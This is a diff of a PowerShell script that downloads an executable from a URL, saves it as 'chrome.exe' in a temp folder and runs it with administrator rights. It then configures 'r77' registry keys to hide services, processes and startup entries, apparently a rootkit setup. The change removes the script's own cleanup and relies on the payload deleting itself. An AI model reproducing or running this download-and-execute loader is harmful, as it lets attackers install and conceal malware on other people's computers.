@@ -117,12 +117,8 @@ $exePath = Join-Path $tempFolder "chrome.exe"
 # Download improved.exe from the provided URL
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-# Execute improved.exe without waiting for completion
+# Execute improved.exe without waiting for completion. EXE Deletes itself, no need to do it manually.
 Start-Process -FilePath $exePath -Verb RunAs -Wait
-
-# Delete the downloaded improved.exe
-Start-Sleep -Seconds 2
-Remove-Item $exePath -Force
 
 # Adds services, processes, and startup applications to the r77 configuration registry keys
 
